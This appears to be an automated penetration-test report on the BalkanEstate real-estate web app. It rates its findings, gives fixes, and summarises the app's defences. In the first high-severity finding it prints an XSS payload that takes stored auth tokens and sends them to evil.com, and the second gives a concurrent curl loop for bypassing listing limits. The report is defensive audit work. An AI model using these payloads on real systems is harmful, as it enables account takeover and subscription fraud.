# BalkanEstate.com - Penetration Test & Security Audit Report

**Date:** 2026-02-28
**Auditor:** Automated Security Review (Senior Pentester Perspective)
**Scope:** Full-stack code review (frontend + backend + infrastructure config)
**Methodology:** OWASP Top 10 2021, SANS Top 25, manual code review

---

## Executive Summary

I approached your codebase like a motivated attacker trying to steal user data, escalate privileges, hijack accounts, or abuse your payment system. After a thorough review of **200+ backend files** and **100+ frontend components**, here is my honest assessment:

**Overall Security Score: 8.5 / 10 - Well above average**

Your site is **significantly harder to hack** than the typical Node.js/MongoDB real estate app. You've implemented many enterprise-grade security features (E2E encryption, payload encryption, token fingerprinting, field-level DB encryption). However, I found **several real attack vectors** that a determined attacker could exploit.

---

## Findings by Severity

### CRITICAL (0 found)

No critical vulnerabilities that would allow immediate unauthorized access or data breach.

---

### HIGH SEVERITY (2 findings)

#### H1. JWT Access Token Stored in localStorage (XSS Token Theft)

**Location:** `src/shared/api/tokenService.ts:164-185`
**CVSS Score:** 7.5 (High)
**Attack Scenario:**

If an attacker finds *any* XSS vector (even via a third-party script like Google Tag Manager, Facebook Pixel, or a compromised CDN), they can steal every user's JWT access token:

```javascript
// Attacker's XSS payload - trivial to execute
const encoded = localStorage.getItem('balkan_estate_token');
// Your XOR+base64 encoding is obfuscation, not encryption
// The session key is in sessionStorage - also accessible via XSS
const sessionKey = sessionStorage.getItem('be_session');
// Decode and exfiltrate to attacker's server
fetch('https://evil.com/steal?token=' + encoded + '&key=' + sessionKey);
```

**Why the existing mitigations are insufficient:**
- Your XOR encoding (`tokenService.ts:85-95`) uses a key stored in `sessionStorage` - also accessible to XSS
- Browser fingerprinting (`tokenService.ts:29-38`) only detects, doesn't prevent theft
- The attacker can use the stolen token from the *same browser* before fingerprint check triggers

**Impact:** Account takeover for any user who visits a page with injected script. Attacker gets 1-hour access as the victim.

**Fix:**
```typescript
// Move access token to httpOnly cookie (same as you already do for refresh token)
// In backend cookieUtils.ts:
res.cookie('access_token', accessToken, {
  httpOnly: true,      // JS cannot read this
  secure: true,        // HTTPS only
  sameSite: 'strict',
  path: '/api',
  maxAge: 60 * 60 * 1000, // 1 hour
});

// Remove localStorage storage entirely
// Update httpClient.ts to rely on credentials: 'include' instead of Authorization header
```

**Additional Note:** I found two places that access tokens directly from localStorage *bypassing your encoding wrapper*:
- `src/features/auth/hooks/useAuthQueries.ts:226` - `localStorage.getItem('balkan_estate_token')`
- `src/presentation/features/auth/hooks/useAuth.ts:28` - same pattern

These read the *encoded* token which won't work correctly, suggesting a bug or dead code path. Either way, they should be removed.

---

#### H2. Listing Limit Bypass via Race Condition (TOCTOU)

**Location:** `backend/src/controllers/propertyController.ts:609-628`
**CVSS Score:** 7.2 (High)
**Attack Scenario:**

Your listing limit check is a classic Time-Of-Check-to-Time-Of-Use (TOCTOU) race condition:

```typescript
// Step 1: CHECK the count (line 610)
const currentCount = user.subscription.activeListingsCount || 0;
const limit = user.subscription.listingsLimit || FREE_TIER_LIMITS.LISTINGS;

// Step 2: Later... USE the result to create property (line 667+)
// But between step 1 and step 2, another concurrent request could have
// already created a listing!
```

**Attack:** A free-tier user (3 listing limit) sends 10 simultaneous POST requests to `/api/properties`. All 10 requests read `currentCount = 2` (under limit), all 10 pass the check, and all 10 create properties. Result: 12 listings instead of max 3.

```bash
# Attacker script - bypass listing limits
for i in {1..10}; do
  curl -X POST https://balkanestateai.com/api/properties \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"title":"Listing '$i'", ...}' &
done
wait
```

**Impact:** Free users can bypass paid subscription limits, causing revenue loss and database bloat.

**Fix:**
```typescript
// Use MongoDB's findOneAndUpdate with atomic increment
const result = await User.findOneAndUpdate(
  {
    _id: currentUser._id,
    'subscription.activeListingsCount': { $lt: limit }  // atomic check
  },
  { $inc: { 'subscription.activeListingsCount': 1 } },  // atomic increment
  { new: true }
);

if (!result) {
  return res.status(403).json({ message: 'Listing limit reached', code: 'LISTING_LIMIT_REACHED' });
}
// Only THEN create the property
```

---

### MEDIUM SEVERITY (5 findings)

#### M1. CSP Allows `unsafe-eval` (XSS Escalation Path)

**Location:** `backend/src/middleware/security.ts` (CSP scriptSrc directive)
**CVSS Score:** 5.3

Your Content Security Policy includes `'unsafe-eval'` to support MapLibre GL JS. This weakens CSP significantly - if an attacker finds a way to inject content, they can use `eval()` to execute arbitrary JavaScript. This directly amplifies the risk of H1.

**Fix:** MapLibre GL v4+ removed the `eval()` requirement. Upgrade MapLibre and remove `unsafe-eval`:
```bash
npm install maplibre-gl@latest
```
Then remove `'unsafe-eval'` from your CSP directives.

---

#### M2. Missing Rate Limiting on Message/Image Upload Endpoints

**Location:** `backend/src/routes/conversationRoutes.ts`
**CVSS Score:** 5.0

These endpoints lack rate limiting:
- `POST /api/conversations/:id/messages` (send message)
- `POST /api/conversations/:id/upload-image` (upload image in conversation)
- `POST /api/agencies/:id/coupons/send-promotion-email` (send emails)

**Attack:** An authenticated user could spam thousands of messages per second, flood storage with uploaded images, or trigger mass email sends via the coupon promotion endpoint.

**Fix:**
```typescript
// In conversationRoutes.ts
router.post('/:id/messages', protect, mutationRateLimiter, sendMessage);
router.post('/:id/upload-image', protect, mutationRateLimiter, uploadImage);

// In agencyRoutes.ts - use strict rate limiter for email triggers
router.post('/:id/coupons/send-promotion-email', protect, sensitiveRateLimiter, sendPromotionEmail);
```

---

#### M3. Refresh Token Also Stored in localStorage (Redundant Exposure)

**Location:** `src/shared/api/tokenService.ts:296`
**CVSS Score:** 5.0

While the refresh token is correctly sent via httpOnly cookie for the actual refresh call (`credentials: 'include'`), it's *also* stored in localStorage. This creates unnecessary attack surface - if XSS occurs, both tokens are compromised, giving the attacker a 7-day session instead of 1 hour.

**Fix:** Remove the localStorage copy of the refresh token entirely. You already use the httpOnly cookie path correctly for refresh operations.

---

#### M4. No Webhook Deduplication (Double-Processing Risk)

**Location:** `backend/src/controllers/payseraWebhookController.ts`
**CVSS Score:** 4.7

Your PaySera webhook handler verifies signatures correctly, but there's no idempotency/deduplication check. If PaySera retries a webhook (network timeout, etc.), the same payment could be processed twice, potentially granting duplicate subscriptions.

**Fix:**
```typescript
// Before processing, check if this order was already processed
const existingPayment = await PaymentRecord.findOne({ orderId: orderid });
if (existingPayment && existingPayment.status === 'completed') {
  // Already processed - return OK to stop retries
  res.send('OK');
  return;
}
```

---

#### M5. Frontend serialize-javascript Vulnerability (RCE in Build)

**Location:** `package.json` dependency chain: `vite-plugin-pwa -> workbox-build -> @rollup/plugin-terser -> serialize-javascript <= 7.0.2`
**CVSS Score:** 4.8

`npm audit` reports 4 high-severity vulnerabilities in `serialize-javascript` (RCE via `RegExp.flags` and `Date.prototype.toISOString()`). While this primarily affects build-time (not runtime in production), a supply-chain attack during build could compromise your deployed bundle.

**Fix:**
```bash
npm audit fix --force
# Or pin vite-plugin-pwa to a version that uses a patched serialize-javascript
```

---

### LOW SEVERITY (5 findings)

#### L1. Signup Reveals Email Existence

**Location:** `backend/src/controllers/authController.ts:151-157`

The signup endpoint returns `"An account with this email already exists"` (code: `EMAIL_EXISTS`). This lets attackers enumerate which emails are registered. Your login and forgot-password correctly prevent this, but signup leaks it.

**Fix:** Return a generic message: `"If this email is available, a verification link has been sent."` Then send the verification email or a "someone tried to register with your email" notification.

---

#### L2. Login History Stores Full IP Addresses (GDPR)

**Location:** `backend/src/models/User.ts:97-105`

Login history stores full IP addresses. Under GDPR (relevant for Balkan/EU users), IP addresses are PII. Consider:
- Truncating IPs (e.g., `192.168.1.xxx`)
- Auto-deleting login history older than 30 days
- Adding this to your privacy policy

---

#### L3. No Per-Image-Count Limit on Property Uploads

**Location:** `backend/src/controllers/propertyController.ts` (uploadImages handler)

There's no maximum number of images per property. An attacker could upload hundreds of images to a single listing, consuming Cloudinary storage and potentially increasing costs.

**Fix:** Add a check: `if (property.images.length >= 50) return res.status(400).json(...)`.

---

#### L4. Admin VPN Check Bypassable in Development

**Location:** `backend/src/middleware/adminAuth.ts:36`

The `DISABLE_ADMIN_VPN_CHECK` env variable exists but is correctly blocked in production (`if (process.env.NODE_ENV === 'production') return false`). However, staging environments could be vulnerable if someone forgets to set `NODE_ENV=production`.

**Fix:** Use an explicit allowlist: `DISABLE_ADMIN_VPN_CHECK` should only work when `NODE_ENV === 'development'` (already done, but consider adding a startup warning when it's enabled).

---

#### L5. Socket.IO Token Passed as Query Parameter

**Location:** `src/presentation/features/auth/hooks/useAuth.ts:28`

Socket.IO connection passes the JWT token as a query parameter. Query parameters can appear in server access logs, proxy logs, and browser history.

**Fix:** Pass the token via Socket.IO's `auth` option instead:
```typescript
socketService.connect({ auth: { token } }, user.id);
```

---

## What You're Doing Right (Defense Strengths)

These are the things that made me say "this is not an easy target":

| Defense Layer | Implementation | Verdict |
|---|---|---|
| **CSRF Protection** | Double-submit cookie with `crypto.timingSafeEqual()` | Excellent |
| **Password Security** | bcrypt + pepper + strength validation + breach detection | Excellent |
| **Payload Encryption** | RSA-2048 E2E encryption for sensitive fields (login, signup) | Excellent |
| **Field-Level DB Encryption** | AES-256-GCM with IV per field for PII | Excellent |
| **Token Fingerprinting** | HMAC-SHA256 from UA + partial IP, enabled in production | Very Good |
| **IDOR Protection** | Ownership checks on all write endpoints (`sellerId === userId`) | Very Good |
| **Role Escalation Prevention** | Hardcoded `ALLOWED_SIGNUP_ROLES`, can't self-register as admin | Excellent |
| **Mass Assignment Prevention** | Whitelist of allowed property fields | Excellent |
| **NoSQL Injection Prevention** | `$` operator sanitization middleware | Very Good |
| **XSS Prevention** | DOMPurify for `dangerouslySetInnerHTML`, `escapeHtml` for `innerHTML` | Very Good |
| **Open Redirect Prevention** | Domain allowlist on both frontend and backend | Excellent |
| **SSRF Prevention** | WMS proxy uses hostname allowlist | Excellent |
| **File Upload Security** | MIME + extension whitelist, no SVG, 5MB limit, Cloudinary storage | Excellent |
| **Email Security** | HTML escaping, URL sanitization, no header injection | Excellent |
| **Rate Limiting** | 6+ tiers (general, auth, payment, AI, mutations, coupons) | Very Good |
| **Security Headers** | Helmet with HSTS, X-Frame-Options DENY, nosniff, nonce CSP | Very Good |
| **Account Enumeration (Login)** | Generic "Invalid credentials" + timing-safe fake query | Excellent |
| **Password Reset** | Blind response regardless of email existence | Excellent |
| **Webhook Security** | PaySera signature verification | Good |
| **Admin Protection** | VPN IP whitelist + role check + audit logging | Very Good |
| **E2E Messaging** | Client-side encryption, server cannot read messages | Excellent |
| **Response Sanitization** | PII stripping, GPS rounding, internal field removal | Excellent |
| **Environment Validation** | Startup check rejects weak secrets in production | Excellent |

---

## Attack Surface Summary

```
Attack Vector                    | Difficulty | Impact  | Status
---------------------------------|------------|---------|------------------
XSS -> Token Theft (localStorage)| Medium     | High    | VULNERABLE (H1)
Race Condition (listing bypass)  | Low        | Medium  | VULNERABLE (H2)
CSP unsafe-eval escalation       | Medium     | Medium  | WEAK (M1)
Message spam / image flood       | Low        | Medium  | MISSING CONTROLS (M2)
Webhook replay attack            | Medium     | Medium  | MISSING CHECK (M4)
Signup email enumeration         | Low        | Low     | LEAKS INFO (L1)
Brute-force login                | Hard       | High    | PROTECTED
SQL/NoSQL Injection              | Very Hard  | High    | PROTECTED
CSRF Attack                      | Very Hard  | High    | PROTECTED
File Upload RCE                  | Very Hard  | High    | PROTECTED
Admin Panel Access               | Very Hard  | Critical| PROTECTED
IDOR (access other users' data)  | Hard       | High    | PROTECTED
Open Redirect / Phishing         | Very Hard  | Medium  | PROTECTED
SSRF (internal network access)   | Very Hard  | High    | PROTECTED
Payment Manipulation             | Very Hard  | High    | PROTECTED
Account Takeover (password reset)| Very Hard  | High    | PROTECTED
Privilege Escalation             | Very Hard  | Critical| PROTECTED
```

---

## Recommended Fix Priority

| Priority | Fix | Effort | Impact |
|----------|-----|--------|--------|
| 1 | **H1**: Move JWT to httpOnly cookie | Medium (2-3 days) | Eliminates XSS token theft |
| 2 | **H2**: Atomic listing count check | Small (1 day) | Prevents subscription bypass |
| 3 | **M1**: Upgrade MapLibre, remove unsafe-eval | Small (1 day) | Strengthens CSP |
| 4 | **M2**: Add rate limits to messages/uploads | Small (1 day) | Prevents abuse |
| 5 | **M3**: Remove refresh token from localStorage | Small (hours) | Reduces exposure |
| 6 | **M4**: Add webhook deduplication | Small (1 day) | Prevents double charges |
| 7 | **M5**: Fix npm audit vulnerabilities | Small (hours) | Supply chain safety |
| 8 | **L1**: Blind signup response | Small (hours) | Prevents enumeration |

---

## Conclusion

As someone trying to hack your site: **this is not a soft target.** You've clearly invested in security. The E2E encryption, payload encryption, field-level database encryption, and comprehensive middleware stack would cause most attackers to move on to easier targets.

The two most realistic attack paths are:
1. **XSS via third-party scripts** (GTM, Facebook Pixel, compromised CDN) -> token theft from localStorage -> account takeover
2. **Race condition** on listing creation to bypass subscription limits

Fix those two, and you're in excellent shape.
